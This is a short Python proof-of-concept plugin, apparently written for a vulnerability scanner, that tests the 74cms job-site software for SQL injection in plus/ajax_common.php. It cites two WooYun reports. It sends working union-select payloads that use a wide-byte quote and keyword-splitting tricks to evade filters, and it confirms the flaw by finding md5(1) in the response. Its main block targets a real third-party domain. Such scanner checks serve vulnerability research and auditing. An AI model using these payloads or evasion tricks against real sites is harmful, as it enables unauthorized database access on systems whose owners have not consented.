#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer :http://www.wooyun.org/bugs/wooyun-2014-070316
#refer :http://www.wooyun.org/bugs/wooyun-2014-063225

def assign(service, arg):
    if service == "74cms":
        return True, arg

def audit(arg):
    url1 = arg + 'plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27union+/*!50000SeLect*/+1,md5%281%29,3%23'
    url2 = arg + 'plus/ajax_common.php?act=hotword&query=%E9%8C%A6%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,md5(1),3%23'
    code1, head1, res1, errcode1,finalurl1 =  curl.curl(url1)
    code2, head2, res2, errcode2,finalurl2 =  curl.curl(url2)
    if code1 == 200 or code2 == 200:
        if "c4ca4238a0b923820dcc509a6f75849b" in res1 or "c4ca4238a0b923820dcc509a6f75849b" in res2:
            security_hole('find sql injection: ' + arg+ 'plus/ajax_common.php')

if __name__ == '__main__':
    from dummy import *
    audit(assign('74cms', 'http://www.dzwork.net/')[1])